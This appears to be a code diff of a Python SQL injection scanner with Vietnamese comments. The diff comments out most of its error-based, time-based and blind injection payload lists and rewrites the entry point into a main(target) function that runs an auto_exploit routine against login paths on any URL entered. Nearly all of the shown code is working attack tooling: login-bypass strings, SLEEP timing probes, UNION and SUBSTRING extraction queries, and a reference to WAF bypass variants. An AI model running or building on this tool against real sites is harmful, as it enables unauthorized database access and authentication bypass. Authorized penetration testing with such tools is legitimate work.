@@ -17,30 +17,30 @@ logging.basicConfig(filename='sqli_scan.log', level=logging.INFO, format='%(asct
 
 # Danh sách payloads (đã thay thế CONVERT cho MySQL)
 ERROR_BASED_PAYLOADS = [
-    "' OR '1'='1", "admin' OR 1=1 ", "' OR 1=1 -- ", "' OR 1=1 #", "admin' OR '1'='1",
-    "1' UNION SELECT NULL, NULL -- ", "' AND 1=1 /*", "' OR 1=1; --",
-    "' OR 'a'='a", "' OR 1=1 -- -", "' OR 1=1 # -",
-    "' OR 1=CAST(@@version AS SIGNED) -- ", "' UNION SELECT NULL, NULL, NULL -- "  # Thay CONVERT bằng CAST cho MySQL
+    "' OR '1'='1", "admin' OR 1=1 ", "' OR 1=1 -- "#, "' OR 1=1 #", "admin' OR '1'='1",
+    #"1' UNION SELECT NULL, NULL -- ", "' AND 1=1 /*", "' OR 1=1; --",
+    #"' OR 'a'='a", "' OR 1=1 -- -", "' OR 1=1 # -",
+    #"' OR 1=CAST(@@version AS SIGNED) -- ", "' UNION SELECT NULL, NULL, NULL -- "  # Thay CONVERT bằng CAST cho MySQL
 ]
 
 # Danh sách payloads time-based (dùng SLEEP cho MySQL)
 TIME_BASED_PAYLOADS = [
     "' AND SLEEP(5) -- ", "' OR SLEEP(5) -- ",
-    "' AND IF(1=1, SLEEP(5), 0) -- ", "' OR IF(1=1, SLEEP(5), 0) -- ",
-] + [
-    f"' AND SLEEP({i}) -- " for i in range(1, 11)
-] + [
-    f"' OR SLEEP({i}) -- " for i in range(1, 11)
+    #"' AND IF(1=1, SLEEP(5), 0) -- ", "' OR IF(1=1, SLEEP(5), 0) -- ",
+#] + [
+    #f"' AND SLEEP({i}) -- " for i in range(1, 11)
+#] + [
+   # f"' OR SLEEP({i}) -- " for i in range(1, 11)
 ]
 
 BLIND_SQLI_PAYLOADS = [
     "' AND 1=1", "' AND 1=2", "' AND SUBSTRING((SELECT DATABASE()), 1, 1)='a'",
-    "' AND (SELECT COUNT(*) FROM users)=1", "' AND (SELECT 1)=1",
-    "' AND (SELECT 1)=2", "' AND EXISTS(SELECT * FROM users)",
-    "' AND NOT EXISTS(SELECT * FROM users WHERE id=1)",
-] + [
-    f"' AND SUBSTRING((SELECT @@{var}), 1, 1)='a' -- " for var in ["version", "servername", "database"]
-]
+    #"' AND (SELECT COUNT(*) FROM users)=1", "' AND (SELECT 1)=1",
+    #"' AND (SELECT 1)=2", "' AND EXISTS(SELECT * FROM users)",
+    #"' AND NOT EXISTS(SELECT * FROM users WHERE id=1)",
+] #+ [
+    #f"' AND SUBSTRING((SELECT @@{var}), 1, 1)='a' -- " for var in ["version", "servername", "database"]
+#]
 
 # Biến thể WAF bypass
 WAF_BYPASS_VARIANTS = [
@@ -355,29 +355,35 @@ def auto_exploit(target, paths, max_time=300):
     else:
         print("[!] No SQLi vulnerabilities found.")
 
-# Menu chính
-def scan_sqli_and_continue():
-    global stop_scanning
-    while True:
-        stop_scanning = False
-        successful_payloads.clear()
-
-        target_url = input("Enter target URL to scan for SQLi: ")
-        valid_paths = scan_initial_paths(target_url)
+# Hàm chính
+def main(target):
+    """
+    Main function to execute SQL injection scanning.
+    Args:
+        target (str): The URL to scan.
+    """
+    try:
+        print("=== Advanced SQL Injection Scanner ===")
+        print(f"Scanning {target} for SQL injection vulnerabilities...")
         
-        if valid_paths:
-            print(f"\n[*] Found {len(valid_paths)} login paths. Starting SQLi scan...")
-            auto_exploit(target_url, valid_paths)
-        else:
-            print("[!] No login paths found. Scan skipped.")
+        # Scan for valid paths
+        valid_paths = scan_initial_paths(target)
 
-        print("\nScan completed!")
-        print("1. Scan another URL\n2. Exit")
-        choice = input("Choice (1 or 2): ")
-        if choice != "1":
-            print("[*] Exiting...")
-            sys.exit(0)
+        # Include the base URL in the paths to scan
+        if target not in valid_paths:
+            valid_paths.insert(0, target)
+
+        if valid_paths:
+            print(f"\n[*] Found {len(valid_paths)} login paths: {valid_paths}")
+            auto_exploit(target, valid_paths)
+        else:
+            print("[!] No login paths found. SQLi scan skipped.")
+
+        print("SQLi scan completed!")
+    except Exception as e:
+        print(f"Error in SQLi_auto: {e}")
 
 if __name__ == "__main__":
     print("=== SQL Injection Scanner ===")
-    scan_sqli_and_continue()
+    target = input("Enter target URL to scan for SQLi: ")
+    main(target)
